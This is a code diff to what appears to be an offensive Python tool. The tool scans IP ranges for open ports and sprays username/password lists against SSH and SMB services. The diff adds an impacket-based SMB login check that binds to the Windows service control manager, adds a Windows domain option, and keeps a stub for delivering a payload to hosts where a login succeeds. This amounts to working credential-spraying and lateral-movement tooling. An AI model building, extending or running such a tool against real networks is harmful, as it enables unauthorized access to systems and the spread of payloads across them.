@@ -11,6 +11,9 @@ from ipaddress import ip_network
 from concurrent.futures import ThreadPoolExecutor
 from typing import List, Tuple, Dict
 
+from impacket import smbserver
+from impacket.dcerpc.v5 import transport, scmr
+
 
 SERVICES = {
     'ssh': {
@@ -81,7 +84,7 @@ class TCPScanner(object):
 
 class LoginScanner(object):
 
-    def __init__(self, queue: asyncio.Queue, credentials: Tuple[str, str], tcp_scan_completed: asyncio.Event, timeout=5.0, max_workers=32):
+    def __init__(self, queue: asyncio.Queue, credentials: Tuple[str, str], tcp_scan_completed: asyncio.Event, timeout=5.0, max_workers=4):
         self.queue = queue
         self.credentails = credentials
         self.timeout = timeout
@@ -119,7 +122,7 @@ class LoginScanner(object):
                 ip, port, username, password = (await self.scan_queue.get())
                 if ip in self._success_cache:
                     continue
-                future = self.thread_pool.submit(self.login_attempt, ip, port, username, password, self.timeout)
+                future = self.thread_pool.submit(self.login_attempt, ip, port, username, password)
                 result = await asyncio.wrap_future(future)
                 if result:
                     self.results.append((ip, port, username, password))
@@ -129,24 +132,21 @@ class LoginScanner(object):
             finally:
                 self.scan_queue.task_done()
 
-    @staticmethod
-    def login_attempt(ip: str, port: int, username: str, password: str, timeout: float) -> bool:
+    def login_attempt(self, ip: str, port: int, username: str, password: str) -> bool:
         raise NotImplementedError()
 
-    @staticmethod
-    def deliver_payload(ip: str, port: int, username: str, password: str, payload: str, timeout: float) -> bool:
+    def deliver_payload(self, ip: str, port: int, username: str, password: str, payload: str) -> bool:
         raise NotImplementedError()
 
 
 class SSHLoginScanner(LoginScanner):
 
-    @staticmethod
-    def login_attempt(ip: str, port: int, username: str, password: str, timeout: float, is_retry=False) -> bool:
+    def login_attempt(self, ip: str, port: int, username: str, password: str, is_retry=False) -> bool:
         LOG.info('[ssh worker] Login attempt %s@%s:%d (pw: %s)', username, ip, port, password)
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            ssh.connect(ip, port=port, username=username, password=password, timeout=timeout)
+            ssh.connect(ip, port=port, username=username, password=password, timeout=self.timeout)
             return True
         except (paramiko.BadAuthenticationType, paramiko.AuthenticationException):
             return False
@@ -154,7 +154,7 @@ class SSHLoginScanner(LoginScanner):
             if not is_retry:
                 LOG.warning('SSH protocol exception, retrying attempt ...')
                 time.sleep(round(random.uniform(0.1, 3.0), 2))
-                return SSHLoginScanner.login_attempt(ip, port, username, password, timeout, True)
+                return self.login_attempt(ip, port, username, password, True)
         except Exception as err:
             LOG.exception(err)
         finally:
@@ -164,12 +164,31 @@ class SSHLoginScanner(LoginScanner):
 
 class SMBLoginScanner(LoginScanner):
 
-    @staticmethod
-    def login_attempt(ip: str, port: int, username: str, password: str, timeout: float) -> bool:
+    def __init__(self, *args, **kwargs):
+        self.domain = kwargs.get('domain', '')
+        del kwargs['domain']
+        super().__init__(*args, **kwargs)
+
+    def login_attempt(self, ip: str, port: int, username: str, password: str) -> bool:
         LOG.info('[smb worker] Login attempt %s@%s:%d (pw: %s)', username, ip, port, password)
+        try:
+            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % ip
+            logging.debug('StringBinding %s'%stringbinding)
+            rpc_transport = transport.DCERPCTransportFactory(stringbinding)
+            rpc_transport.set_dport(port)
+            rpc_transport.setRemoteHost(ip)
+            if hasattr(rpc_transport, 'set_credentials'):
+                rpc_transport.set_credentials(username, password, self.domain)
+            rpc_transport.set_kerberos(False, None)
+            _scmr = rpc_transport.get_dce_rpc()
+            _scmr.connect()
+            smb_conn = rpc_transport.get_smb_connection()
+            _scmr.bind(scmr.MSRPC_UUID_SCMR)
+            scmr.hROpenSCManagerW(_scmr)
+            return True
+        except Exception as err:
+            LOG.exception(err)
         return False
-
-
 #
 # > Helpers
 #
@@ -212,6 +231,7 @@ async def main(args):
     if 'smb' in args.services:
         smb_queue = open_queues[SERVICES['smb']['port']]
         smb_scanner = SMBLoginScanner(smb_queue, credentials, tcp_scanner.scan_completed,
+            domain=args.windows_domain,
             timeout=args.timeout,
             max_workers=args.max_login_workers
         )
@@ -223,8 +243,10 @@ async def main(args):
     print('[*] All scans completed')
  
     print('tcp results: %r' % tcp_scanner.results)
-    print('ssh results: %r' % ssh_scanner.results)
-
+    if 'ssh' in args.services:
+        print('ssh results: %r' % ssh_scanner.results)
+    if 'smb' in args.services:
+        print('smb results: %r' % smb_scanner.results)
 
 
 class ValidatServicesAction(argparse.Action):
@@ -273,6 +295,12 @@ if __name__ == '__main__':
         help='credential file (username:password newline delimited)',
         dest='credentials',
         required=True,
+    )
+    parser.add_argument('--windows-domain', '-d',
+        help='windows domain name to use with credentials',
+        dest='windows_domain',
+        default='',
+        type=str,
     )
     parser.add_argument('--services', '-s',
         help='list of services to scan/spray',
